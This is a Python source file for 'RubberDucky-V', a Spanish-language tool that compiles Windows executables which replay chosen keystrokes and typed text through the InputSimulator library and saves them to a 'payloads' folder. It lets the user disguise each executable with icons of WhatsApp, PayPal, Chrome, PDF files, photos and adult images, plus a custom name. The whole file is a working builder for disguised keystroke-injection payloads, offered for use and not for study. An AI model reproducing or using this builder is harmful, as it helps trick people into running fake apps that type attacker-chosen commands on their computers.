from banner import banner_main, main_code_c, banner_main_move, config_project
from maps import map_keyboard, map_icons
import os
import sys
import random
import time
import shutil
import colorama

colorama.init(autoreset=True)

cyan = colorama.Fore.CYAN
yellow = colorama.Fore.YELLOW
red = colorama.Fore.RED

list_close_words = ["ctrlleft", "ctrlright", "del", 
                    "arrowUp", "arrowDown", "arrowRight", 
                    "arrowLeft", "enter", "esc", "fn", 
                    "printscreen", "shiftleft", "shiftright", 
                    "space", "tab", "winleft", "winright", 
                    "altleft", "altright", "backspace", "=",
                    "+", "-", " ", ""]

list_simple_events = []
list_double_events = []
list_max_events = []
total_events = []

get_index = 0
icon_file = "rubberducky"
name_file = None

def menu_main():
    banner_main_move()

    print(f"{cyan}[{yellow}01{cyan}]- {yellow}Crear RubberDucky-V\n{cyan}[{yellow}02{cyan}]- {yellow}Salir de RubberDucky-V")
    print(f"{cyan}──────────────────────────────────────")
    option_main = input(f"{cyan}[{yellow}RubberDucky-V{cyan}]>> {colorama.Fore.RESET}")

    return option_main

def words_transform(event):
    if event.lower() == "ctrlleft":
        event = "LCONTROL"
    elif event.lower() == "ctrlright":
        event = "RCONTROL"
    elif event.lower() == "del":
        event = "DELETE"
    elif event.lower() == "arrowup":
        event = "UP"
    elif event.lower() == "arrowdown":
        event = "DOWN"
    elif event.lower() == "arrowleft":
        event = "LEFT"
    elif event.lower() == "arrowright":
        event = "RIGHT"
    elif event.lower() == "enter":
        event = "RETURN"
    elif event.lower() == "esc":
        event = "ESCAPE"
    elif event.lower() == "printscreen":
        event = "SNAPSHOT"
    elif event.lower() == "shiftleft":
        event = "LSHIFT"
    elif event.lower() == "shiftright":
        event = "RSHIFT"
    elif event.lower() == "space":
        event = "SPACE"
    elif event.lower() == "tab":
        event = "TAB"
    elif event.lower() == "winleft":
        event = "LWIN"
    elif event.lower() == "winright":
        event = "RWIN"
    elif event.lower() == "altleft":
        event = "LMENU"
    elif event.lower() == "altright":
        event = "RMENU"
    elif event.lower() == "backspace":
        event = "BACK"
    elif event.lower() == "-":
        event = "OEM_MINUS"
    elif event.lower() == "+":
        event = "OEM_PLUS"
    elif event.lower() == "=":
        event = "OEM_EQUALS"
    elif event.lower() == " " or event.lower() == "":
        event = "SPACE"

    return event


def menu_create_rbv():
    banner_main()
    global list_simple_events
    global list_double_events
    global max_event
    global total_events

    counter = 0
    bar_pro = "█"
    bar_pro_percentage = 0
    
    global get_index

    config_exe = []

    global icon_file
    global name_file

    print(f"{cyan}[{yellow}01{cyan}]- {yellow}Agregar evento de teclado simple\n{cyan}[{yellow}02{cyan}]- {yellow}Agregar evento de teclado doble\n{cyan}[{yellow}03{cyan}]- {yellow}Agregar evento de teclado max\n{cyan}[{yellow}04{cyan}]- {yellow}Agregarle un nombre\n{cyan}[{yellow}05{cyan}]- {yellow}Agregarle un icono\n{cyan}[{yellow}06{cyan}]- {yellow}Ver eventos agregados\n{cyan}[{yellow}07{cyan}]- {yellow}Compilar a un ejecutable\n{cyan}[{yellow}08{cyan}]- {yellow}Salir de RubberDucky-V")
    print(f"{cyan}──────────────────────────────────────")
    option_create_rbv = input(f"{cyan}[{yellow}RubberDucky-V{cyan}]>> {colorama.Fore.RESET}")

    if option_create_rbv == "01" or option_create_rbv  == "1":
        banner_main()
        map_keyboard()

        simple_event = input(f"{cyan}[{yellow}Agrega una pulsacion{cyan}]>> {colorama.Fore.RESET}")

        if simple_event in list_close_words:
            simple_event = words_transform(simple_event)

        else:
            simple_event = simple_event[0]
            simple_event = "VK_" + simple_event

        list_simple_events.append(simple_event)
        total_events.append(f"Evento simple:   {simple_event}")
        
        input(f"\n{red}[!] Evento {yellow}({simple_event}) {red}agregado con exito, precione {yellow}ENTER {red}para continuar...")

        menu_create_rbv()



    elif option_create_rbv == "02" or option_create_rbv == "2":
        banner_main()
        map_keyboard()
        
        double_event1 = input(f"{cyan}[{yellow}Agrega la primera pulsacion{cyan}]>> {colorama.Fore.RESET}")
        double_event2 = input(f"{cyan}[{yellow}Agrega la segunda pulsacion{cyan}]>> {colorama.Fore.RESET}")

        if double_event1 in list_close_words:
            double_event1 = words_transform(double_event1)
        else:
            double_event1 = double_event1[0]
            double_event1 = "VK_" + double_event1

        if double_event2 in list_close_words:
            double_event2 = words_transform(double_event2)
        else:
            double_event2 = double_event2[0]
            double_event2 = "VK_" + double_event2

        list_double_events.append(f"{double_event1}, {double_event2}")
        total_events.append(f"Evento doble:    {double_event1}, {double_event2}")

        input(f"\n{red}[!] Evento {yellow}({double_event1}, {double_event2}) {red}agregado con exito, precione {yellow}ENTER {red}para continuar...")

        menu_create_rbv()



    elif option_create_rbv == "03" or option_create_rbv == "3":
        banner_main()

        max_event = input(f"{cyan}[{yellow}Agrega el texto para el evento max{cyan}]>> {colorama.Fore.RESET}")

        list_max_events.append(max_event)
        total_events.append(f"Evento max:      {max_event}")

        input(f"\n{red}Evento {yellow}({max_event}) {red}agregado con exito, precione {yellow}ENTER {red}para continuar...")

        menu_create_rbv()


    elif option_create_rbv == "04" or option_create_rbv == "4":
        banner_main()

        name_file = input(f"{cyan}[{yellow}Agrega un nombre para el ejecutable{cyan}]>> {colorama.Fore.RESET}")

        input(f"\n{red}[!] Se agrego el nombre {yellow}{name_file}{red} para el ejecutable, precione {yellow}ENTER {red}para continuar...")

        menu_create_rbv()

        
    
    elif option_create_rbv == "05" or option_create_rbv == "5":
        banner_main()

        print(f"        {yellow}Iconos dispopnibles")
        print(f"{cyan}──────────────────────────────────────")
        print(f"{cyan} Vista Previa: {yellow}https://ibb.co/7yNN1J9")
        print(f"{cyan}──────────────────────────────────────")
        print(f"{cyan}[{yellow}01{cyan}]-{yellow} Whatsapp      {cyan}[{yellow}26{cyan}]-{yellow} Alerta")
        print(f"{cyan}[{yellow}02{cyan}]-{yellow} Facebook      {cyan}[{yellow}27{cyan}]-{yellow} FL Studio")
        print(f"{cyan}[{yellow}03{cyan}]-{yellow} Telegram      {cyan}[{yellow}28{cyan}]-{yellow} Carpeta1")
        print(f"{cyan}[{yellow}04{cyan}]-{yellow} Netflix       {cyan}[{yellow}29{cyan}]-{yellow} Carpeta2")
        print(f"{cyan}[{yellow}05{cyan}]-{yellow} Youtube       {cyan}[{yellow}30{cyan}]-{yellow} Carpeta3")
        print(f"{cyan}[{yellow}06{cyan}]-{yellow} Snapchat      {cyan}[{yellow}31{cyan}]-{yellow} Carpeta4")
        print(f"{cyan}[{yellow}07{cyan}]-{yellow} Udemy         {cyan}[{yellow}32{cyan}]-{yellow} Traductor ")
        print(f"{cyan}[{yellow}08{cyan}]-{yellow} TikTok        {cyan}[{yellow}33{cyan}]-{yellow} Google Photo")
        print(f"{cyan}[{yellow}09{cyan}]-{yellow} Instagram     {cyan}[{yellow}34{cyan}]-{yellow} Google Maps")
        print(f"{cyan}[{yellow}10{cyan}]-{yellow} Twitch        {cyan}[{yellow}35{cyan}]-{yellow} Google Drive")
        print(f"{cyan}[{yellow}11{cyan}]-{yellow} Reddit        {cyan}[{yellow}36{cyan}]-{yellow} Photo1")
        print(f"{cyan}[{yellow}12{cyan}]-{yellow} Paypal        {cyan}[{yellow}37{cyan}]-{yellow} Photo2")
        print(f"{cyan}[{yellow}13{cyan}]-{yellow} Pinterest     {cyan}[{yellow}38{cyan}]-{yellow} PDF")
        print(f"{cyan}[{yellow}14{cyan}]-{yellow} HBO           {cyan}[{yellow}39{cyan}]-{yellow} Media Player")
        print(f"{cyan}[{yellow}15{cyan}]-{yellow} Discord       {cyan}[{yellow}40{cyan}]-{yellow} XXX")
        print(f"{cyan}[{yellow}16{cyan}]-{yellow} Gmail         {cyan}[{yellow}41{cyan}]-{yellow} Google Meet")
        print(f"{cyan}[{yellow}17{cyan}]-{yellow} Spotify       {cyan}[{yellow}42{cyan}]-{yellow} M-Word")
        print(f"{cyan}[{yellow}18{cyan}]-{yellow} Chrome        {cyan}[{yellow}43{cyan}]-{yellow} Minecraft")
        print(f"{cyan}[{yellow}19{cyan}]-{yellow} Edge          {cyan}[{yellow}44{cyan}]-{yellow} Roblox")
        print(f"{cyan}[{yellow}20{cyan}]-{yellow} Firefox       {cyan}[{yellow}45{cyan}]-{yellow} GTA-V")
        print(f"{cyan}[{yellow}21{cyan}]-{yellow} Opera         {cyan}[{yellow}46{cyan}]-{yellow} The Sims")
        print(f"{cyan}[{yellow}22{cyan}]-{yellow} Tor           {cyan}[{yellow}47{cyan}]-{yellow} Privado")
        print(f"{cyan}[{yellow}23{cyan}]-{yellow} Photoshop     {cyan}[{yellow}48{cyan}]-{yellow} IMGxxx1")
        print(f"{cyan}[{yellow}24{cyan}]-{yellow} Adobe XD      {cyan}[{yellow}49{cyan}]-{yellow} IMGxxx2")
        print(f"{cyan}[{yellow}25{cyan}]-{yellow} Steam         {cyan}[{yellow}50{cyan}]-{yellow} IMGxxx3")
        print(f"{cyan}[{yellow}51{cyan}]-{yellow} Salir de RubberDucky-V")
        print(f"{cyan}──────────────────────────────────────")

        icon_file = input(f"{cyan}[{yellow}Agrega un icono al ejecutable{cyan}]>> {colorama.Fore.RESET}")

        if icon_file == "51":
            sys.exit()
        else:
            icon_file = map_icons(icon_file)

   

        input(f"\n{red}[!] Se agrego el icono al ejecutable, precione {yellow}ENTER {red}para continuar...")

        menu_create_rbv()
          

    elif option_create_rbv == "06" or option_create_rbv == "6":
        banner_main()

        print(f"          {yellow}Eventos agregados")
        print(f"{cyan}──────────────────────────────────────")

        for i in total_events:
            counter += 1
            print(f"{cyan}{counter}- {yellow}{i}")

        input(f"\n{red}[!] Preciona {yellow}ENTER {red}para ir atras...")
        menu_create_rbv()
    

    elif option_create_rbv == "07" or option_create_rbv == "7":
        banner_main()

        name_project = "project" + str(random.randint(1000000, 9999999))

        print(f"{yellow}Creando un nuevo proyecto...")

        os.system(f"dotnet new console -n {name_project} > /dev/null 2>&1")
        os.system(f"cd {name_project} && dotnet add package InputSimulator > /dev/null 2>&1")

        for j in range(0, 26):
            print(f"\r{yellow}[{cyan}{bar_pro_percentage}%{yellow}]{cyan}{bar_pro}", end="")
            bar_pro += "█"
            bar_pro_percentage += 4
            time.sleep(0.1)

        bar_pro = "█"
        bar_pro_percentage = 0
        print("\n")

        
        print(f"{yellow}Configurando la plantilla...")

        config_exe = config_project()

        config_exe = config_exe.replace(f"<ApplicationIcon>XXXXXX</ApplicationIcon>", f"<ApplicationIcon>../icons/{icon_file}.ico</ApplicationIcon>")

        with open(f"{name_project}/{name_project}.csproj", "w") as file:
            file.write(config_exe)
            file.close()
            del file

        with open(f"{name_project}/Program.cs", "w") as file:
            file.write(main_code_c())
            file.close()
            del file

        with open(f"{name_project}/Program.cs", "r") as file:
            lines_program_c = file.readlines()
            file.close()
            del file

        for n, lines in enumerate(lines_program_c):
            if "InputSimulator simulator = new InputSimulator();" in lines:
                get_index = n
                break

        for o in reversed(total_events):
            if "Evento simple:" in o:
                trash, value = o.split(":")
                value = value.replace(" ", "")
                lines_program_c.insert(get_index + 2, f"\t\tsimulator.Keyboard.KeyPress(VirtualKeyCode.{value.upper()});\n\nThread.Sleep(200);\n")

            elif "Evento doble:" in o:
                 trash, values = o.split(":")
                 values = values.replace(" ", "")
                 value1, value2 = values.split(",")         
                 lines_program_c.insert(get_index + 2, f"\t\tsimulator.Keyboard.ModifiedKeyStroke(VirtualKeyCode.{value1.upper()}, VirtualKeyCode.{value2.upper()});\n\nThread.Sleep(200);\n")    
        
            elif "Evento max:" in o:
                value = o.replace("Evento max:      ", "")
                lines_program_c.insert(get_index + 2, f'\t\tsimulator.Keyboard.TextEntry("{value}");\n\nThread.Sleep(200);\n')


        with open(f"{name_project}/Program.cs", "w") as file:
            file.writelines(lines_program_c)
            file.close()
            del file


        for k in range(0, 26):
            print(f"\r{yellow}[{cyan}{bar_pro_percentage}%{yellow}]{cyan}{bar_pro}", end="")
            bar_pro += "█"
            bar_pro_percentage += 4
            time.sleep(0.1)

        
        print(f"\n\n{yellow}Compilado ejecutable...")

        os.system(f"cd {name_project} && dotnet publish -c Release -r win-x64 --self-contained true -p:PublishSingleFile=true > /dev/null 2>&1")

        shutil.copy(f"{name_project}/bin/Release/net8.0/win-x64/publish/{name_project}.exe", "payloads/")

        if name_file:
            os.rename(f"payloads/{name_project}.exe", f"payloads/{name_file}.exe")
        else:
            pass
        
        shutil.rmtree(name_project)

        bar_pro = "█"
        bar_pro_percentage = 0
        
        for m in range(0, 26):
            print(f"\r{yellow}[{cyan}{bar_pro_percentage}%{yellow}]{cyan}{bar_pro}", end="")
            bar_pro += "█"
            bar_pro_percentage += 4
            time.sleep(0.1)

    elif option_create_rbv == "08" or option_create_rbv == "8":
    	os.system("clear")
    	sys.exit()


    else:
        input(f"\n{red}[!] La opción seleccionada no existe, preciona {yellow}ENTER {red}para reintentar...")
        menu_create_rbv()


while True:
    option_main = menu_main()

    if option_main == "1" or option_main == "01":
        menu_create_rbv()
        input(f"\n\n{red}[!] El ejecutable fue guardado en la carpeta payloads, precione {yellow}ENTER {red}para continuar...")
        get_index = 0
        icon_file = "rubberducky"
        name_file = None
        list_simple_events = []
        list_double_events = []
        list_max_events = []
        total_events = []

    elif option_main == "2" or option_main == "02":
        os.system("clear")
        break

    else:
        input(f"\n{red}[!] La opción seleccionada no existe, precione {yellow}ENTER {red}para reintentar...")
              

                                                                                          
